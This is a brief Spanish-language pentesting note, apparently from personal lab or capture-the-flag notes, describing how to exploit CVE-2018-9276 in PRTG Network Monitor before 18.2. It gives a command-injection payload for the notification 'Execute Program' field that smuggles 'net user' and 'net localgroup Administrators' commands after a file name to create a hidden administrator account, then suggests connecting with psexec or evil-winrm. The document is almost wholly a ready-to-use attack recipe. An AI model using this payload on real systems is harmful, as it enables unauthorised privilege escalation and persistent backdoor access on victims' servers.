Credenciales por defecto

PRTG Network Monitor < 18.2 (CVE-2018-9276)

Para explotar esta vulnerabilidad hacen falta credenciales válidas y acceso al panel web.

Crear una nueva notificación.

Basic Notification Setting: Powned

Payload en Execute Program: el usuario que ejecuta PRTG suele tener privilegios altos en el sistema.

Payload: crear usuario y añadirlo a administradores

test.txt;net user <user> <password> /add; net localgroup Administrators <user> /add

Ejecutar la notificación.

Después se puede probar conexión con psexec por SMB o con evil-winrm si WinRM está expuesto en el puerto 5985.
